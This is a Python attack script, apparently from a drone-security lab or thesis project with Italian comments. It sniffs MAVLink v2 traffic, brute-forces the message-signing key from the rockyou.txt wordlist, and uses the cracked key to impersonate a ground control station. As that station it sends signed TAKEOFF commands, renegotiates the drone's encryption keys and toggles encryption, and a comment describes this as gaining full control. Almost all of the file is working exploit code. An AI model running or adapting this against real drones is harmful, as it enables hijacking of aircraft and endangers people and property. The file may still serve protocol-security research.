from pymavlink import mavutil
from pymavlink.dialects.v20 import secure as mavlink2
from scapy.all import sniff
import hmac, hashlib, time, os
from crypto_utils import generate_ecdh_keypair, derive_shared_key, encrypt, decrypt

parser = mavlink2.MAVLink(None)
KEY_CRITTO = b''
KEY_SIGNA = b''
quale_cifrario = 2
confidenzialita_attiva = False

global header_bytes
global payload_bytes
global crc_bytes
global link_id
global timestamp
global hmac_bytes
global signature_bytes

ECC_CURVES = {
    1: "secp224r1", 
    2: "secp256r1",
    3: "secp384r1",
    4: "secp521r1",
}
SYMMETRIC_CIPHER = {
    1: "AES-CBC-256", 
    2: "AES-CBC-128",
    3: "ChaCha20-256"
}

def function(pkt):
    global header_bytes, payload_bytes, crc_bytes, timestamp, link_id, hmac_bytes, signature_bytes
    if pkt.haslayer("UDP"):
        data = bytes(pkt["UDP"].payload)
        for b in data:
            msg = parser.parse_char(bytes([b]))
            if msg:
                print(f"Messaggio intercettato:\n  {msg.get_type()} from sys={msg.get_srcSystem()} comp={msg.get_srcComponent()}\n  {msg}")                
                header_bytes = data[0:10]
                payload_lenght = list(header_bytes)[1]
                payload_bytes = data[10:10+payload_lenght]
                crc_bytes = data[10+payload_lenght:10+payload_lenght+2]
                signature_bytes = data[-13:]
                byte_list = list(signature_bytes)
                link_id = byte_list[0]
                timestamp = int.from_bytes(signature_bytes[1:7], byteorder='little')
                hmac_bytes = signature_bytes[7:]

#Questa funzione è una funzione di prova che è stata definita per capire se i byte del fram MAVLink sono stati catturati e selezionati per bene. Inoltre permette di capire se l'hash è stato calcolato correttamente.
def HMAC_calcolo(chiave, dati):
	msg_to_sign = chiave + dati
	digest = hashlib.sha256(msg_to_sign).digest()
	signature = digest[:6]
	return signature
	
print("Attendo la ricezione di un messaggio MAVLink non cifrato...\n")

sniff(filter="udp port 14550", prn=function, iface="lo", count=1)

print("   - Signature (last 13 bytes):", signature_bytes.hex())
print("   - Header (first 10 bytes):", header_bytes.hex())
print("   - Payload (n bytes):", payload_bytes.hex())
print("   - CRC (2 bytes):", crc_bytes.hex())
print("   - Link ID:", link_id)
print("   - Timestamp:", timestamp)
print("   - HASH originale: ",hmac_bytes.hex())

secret_key = ''
dati = header_bytes + payload_bytes + crc_bytes + link_id.to_bytes(1, "little") + timestamp.to_bytes(6, "little")
with open("rockyou.txt", "r") as f:
    for num, riga in enumerate(f, start=1):
        hash_calcolato = HMAC_calcolo(riga.rstrip().encode('utf-8'), dati)
        if hmac_bytes == hash_calcolato:
            secret_key = riga.rstrip()
            print(f"\n\nCHIAVE DI FIRMA TROVATA. ESSA E' {secret_key}")
            break

if secret_key == '':      
    print(f"\n\nCHIAVE DI FIRMA NON TROVATA. Termino")
    exit()

KEY_SIGNA = secret_key



#ho ottenuto la password. Effettuo allora uno scambio per riconfigurare il set di password. In seguito avrei ottenuto pieno controllo.
def cifratura(msg):
    if quale_cifrario == 3:
        iv = os.urandom(24)
    else:
        iv = os.urandom(16)

    frame = msg.pack(mav) # Pack del messaggio per ottenere frame MAVLink v2
    #print(f"Frame serializzato originale: {frame.hex()}")

    # Calcola offset payload
    HEADER_LEN = 0
    if hex(frame[0]) == hex(253):
        HEADER_LEN = 10 # The minimum packet length is 12 bytes for acknowledgment packets without payload.
    else:
        HEADER_LEN = 6
    payload_len = frame[1] # prende il campo len dal frame
    payload_start = HEADER_LEN
    payload_end = payload_start + payload_len

    # Cifra solo il payload, quindi prendo solo i byte di esso
    payload_chiaro = frame[payload_start:payload_end]

    encrypted_payload = encrypt(payload_chiaro, iv, KEY_CRITTO, quale_cifrario)

    # Ricostruisce frame con payload cifrato
    # Attenzione! metto come lunghezza del payload la lunghezza del testo cifrato con padding 
    if len(encrypted_payload) > 240:
        frame2 = frame[:1] + bytes([255]) + frame[2:]
    else:
        frame2 = frame[:1] + bytes([len(encrypted_payload)]) + frame[2:]
    encrypted_frame = frame2[:payload_start] + encrypted_payload + frame2[payload_end:] + iv
    
    return encrypted_frame

def attiva_cifratura(attivo):
    global confidenzialita_attiva, pausa
    pausa = True
    timeout = 5  # Secondi
    riuscito = False
    for i in range(0,4):
        start_time = time.time()
        print("\n\n")
        ricevuto = False
        mav.change_mode_send(target_system=1, target_component=0, encryption=attivo)
        print(f"Inoltrata la richiesta per passare in modalità {attivo}. Richiesta numero {i}")
        try:
            while time.time() - start_time < timeout and ricevuto == False:
                byte = conn.recv()
                if not byte:
                    time.sleep(0.001)  # Aspetta un po' per non consumare CPU
                    continue
                msg = mav.parse_char(byte)
                if msg.get_type() == "KEY_EXCHANGE_ACK":
                    ricevuto = True

            if ricevuto and msg.get_type() == "KEY_EXCHANGE_ACK" and getattr(msg, "_signed", False) and msg.status == 1:
                print(f"Ricevuto l'ack ({msg.get_type()}) di conferma switch\n")
                if attivo == 1:
                    confidenzialita_attiva = True
                else:
                    confidenzialita_attiva = False
                riuscito = True
                break
            else:
                print("Messaggio di ACK ricevuto o ERRATO o signature errata. Ritento\n")
        except Exception as e:
            print(f"ERRORE, messaggio scartato in quanto la signature è errata. Switch non avvenuto")
    if not riuscito:
        print("Switch in modalità cifrata non riuscito")
    pausa = False

    
nome = input("Premi INVIO per sferrare l'attacco: concordare le chiavi. ")

# Il programma riprende l'esecuzione dopo che l'utente ha premuto Invio
print("\nOK. Attacco iniziato!")

# Mi connetto al drone
# Connessione drone --> GCS
conn = mavutil.mavlink_connection('udpout:127.0.0.1:14550', dialect='secure') #, source_system=2
conn.force_mavlink2 = True
mav = mavlink2.MAVLink(conn, srcSystem=100)#, srcComponent=200)
mav.robust_parsing = True
mav.signing.secret_key = KEY_SIGNA.encode()
mav.signing.link_id = 1
mav.signing.sign_outgoing = True

def invio_key_public_exchange(num_curva, cifrario):
    priv_gcs, pub_gcs = generate_ecdh_keypair(num_curva)
    print("Coppie di chiavi del GCS calcolate")
    # invio la mia pubkey
    mav.key_public_exchange_send(
        target_system=1,
        target_component=0,
        public_key_x=pub_gcs.x.to_bytes(125, 'big'),
        public_key_y=pub_gcs.y.to_bytes(125, 'big'),
        key_len=num_curva,
        symmetric_cipher=cifrario
    )
    return priv_gcs

def concordo_chiavi_simmetriche(num_curva, cifrario):
    global KEY_CRITTO, KEY_SIGNA, IV, quale_cifrario, pausa
    pausa = True

    while True:
        msg = conn.recv_match(blocking=False)
        if msg is None:
            break

    # Attendo le chiavi dal drone. Attendo max per 5 secondo altrimenti rinvio nuove chiavi.
    timeout = 5  # Secondi
    riuscito = False
    for i in range(0,4):
        start_time = time.time()
        print("\n\n")
        ricevuto = False
        priv_gcs = invio_key_public_exchange(num_curva, cifrario) # genero la mia coppia e calcolo shared key
        print(f"Inoltrata la chiave pubblica + richiesta scambio chiave inviata al drone. Tentativo num. {i}")
        try:
            while time.time() - start_time < timeout and ricevuto == False:
                byte = conn.recv()
                if not byte:
                    time.sleep(0.001)  # Aspetta un po' per non consumare CPU
                    continue
                msg = mav.parse_char(byte)
                if msg.get_type() == "KEY_PUBLIC_EXCHANGE":
                    ricevuto = True
                    break
            #print(f"Ricevuto {msg.get_type()}")
            if ricevuto and msg.get_type() == "KEY_PUBLIC_EXCHANGE" and msg.key_len == num_curva and getattr(msg, "_signed", False):
                print(f"Ricevo la chiave pubblica del drone")
                
                pub_key_drone_x = int.from_bytes(msg.public_key_x, 'big')
                pub_key_drone_y = int.from_bytes(msg.public_key_y, 'big')

                mav.key_exchange_ack_send(target_system=msg.target_system, target_component=0, status=1)
                riuscito = True
                break
            else:
                print("Messaggio ricevuto o ERRATO o signature errata. Ritento")

        except Exception as e:
            print(f"ERRORE, messaggio scartato in quanto la signature è errata. Scambio di chiavi non avvenuto. Ritento {e}")

    if riuscito:
        # Scambio di chiavi avvenuto con successo calcolo la chiave simmetrica
        KEY_CRITTO, KEY_SIGNA = derive_shared_key(priv_gcs, pub_key_drone_x, pub_key_drone_y, num_curva)
        mav.signing.secret_key = KEY_SIGNA
        quale_cifrario = cifrario
        print("Scambio di chiavi avvenuto con successo:")
        print("     - chiave simmetrica concordata: ", KEY_CRITTO.hex())
        print("     - chiave di firma concordata:   ", KEY_SIGNA.hex())
        print("     - cifrario simmetrico scelto:   ", SYMMETRIC_CIPHER.get(quale_cifrario))
        print("     - curva ellittica utilizzata:   \n\n", ECC_CURVES.get(num_curva))
    else:
        print("Scambio di chiavi NON avvenuto.")
    pausa = False
    return riuscito

# Costruisco messaggi standard
msg = mav.command_long_send(
    target_system=1,
    target_component=1,
    command=22,            # MAV_CMD_NAV_TAKEOFF
    confirmation=0,
    param1=42, param2=0, param3=0, param4=0,
    param5=0, param6=0, param7=10
)
print(f"Inviato: command_long\n\n")
time.sleep(2.0)

msg = mav.statustext_send(
    severity=6,  # Informazione
    text="Test messaggio STATUSTEXT dal GCSAttacker".encode('utf-8')
)
print(f"Inviato: statustext\n\n")
time.sleep(2.0)

msg = mav.statustext_send(
    severity=6,
    text="Prova STATUSTEXT da GCSAttacker.".encode('utf-8')
)
print(f"Inviato: statustext\n\n")
time.sleep(2.0)

msg = mav.statustext_send(
    severity=6,  # Informazione
    text="Test messaggio STATUSTEXT dal GCSAttacker".encode('utf-8')
)
print(f"Inviato: statustext\n\n")
time.sleep(2.0)

msg = mav.statustext_send(
    severity=6,
    text="Prova STATUSTEXT da GCSAttacker.".encode('utf-8')
)
print(f"Inviato: statustext\n\n")
time.sleep(2.0)

# Concordo chiavi di cifratura
if concordo_chiavi_simmetriche(2,2):
    print("CHIAVI CONCOORDATE\n\n")

    attiva_cifratura(1) #attiva
    if confidenzialita_attiva:
        # Costruisco messaggi standard
        msg = mav.command_long_encode(
            target_system=1,
            target_component=1,
            command=22,            # MAV_CMD_NAV_TAKEOFF
            confirmation=0,
            param1=42, param2=0, param3=0, param4=0,
            param5=0, param6=0, param7=10
        )
        conn.write(cifratura(msg))
        print(f"Frame cifrato inviato {msg}\n\n")
        time.sleep(2.0)

        msg = mav.statustext_encode(
            severity=6,  # Informazione
            text="Test messaggio STATUSTEXT dal GCS".encode('utf-8')
        )
        conn.write(cifratura(msg))
        print(f"Frame cifrato inviato {msg}\n\n")
        time.sleep(2.0)

        msg = mav.statustext_encode(
            severity=6,
            text="Prova STATUSTEXT da GCS.".encode('utf-8')
        )
        conn.write(cifratura(msg))
        print(f"Frame cifrato inviato {msg}\n\n")
        time.sleep(2.0)

        # Costruisco messaggi standard
        msg = mav.command_long_encode(
            target_system=1,
            target_component=1,
            command=22,            # MAV_CMD_NAV_TAKEOFF
            confirmation=0,
            param1=42, param2=0, param3=0, param4=0,
            param5=0, param6=0, param7=10
        )
        conn.write(cifratura(msg))
        print(f"Frame cifrato inviato {msg}\n\n")
        time.sleep(2.0)

        msg = mav.statustext_encode(
            severity=6,  # Informazione
            text="Test messaggio STATUSTEXT dal GCS".encode('utf-8')
        )
        conn.write(cifratura(msg))
        print(f"Frame cifrato inviato {msg}\n\n")
        time.sleep(2.0)


    attiva_cifratura(0) #NON attiva
    if not confidenzialita_attiva:
        msg = mav.statustext_send(
            severity=6,  # Informazione
            text="Test messaggio STATUSTEXT dal GCSAttacker".encode('utf-8')
        )
        print(f"Inviato: statustext\n\n")
        time.sleep(3.0)

        msg = mav.statustext_send(
            severity=6,
            text="Prova STATUSTEXT da GCSAttacker.".encode('utf-8')
        )
        print(f"Inviato: statustext\n\n")
        time.sleep(3.0)

        msg = mav.statustext_send(
            severity=6,  # Informazione
            text="Test messaggio STATUSTEXT dal GCSAttacker".encode('utf-8')
        )
        print(f"Inviato: statustext\n\n")
        time.sleep(3.0)

        msg = mav.statustext_send(
            severity=6,
            text="Prova STATUSTEXT da GCSAttacker.".encode('utf-8')
        )
        print(f"Inviato: statustext\n\n")
        time.sleep(3.0)

        msg = mav.statustext_send(
            severity=6,  # Informazione
            text="Test messaggio STATUSTEXT dal GCSAttacker".encode('utf-8')
        )
        print(f"Inviato: statustext\n\n")
        time.sleep(3.0)


'''
LISTA DI COSE DA FARE TODO:
 - non va l'attacco se uso il cifrario chacha20
'''
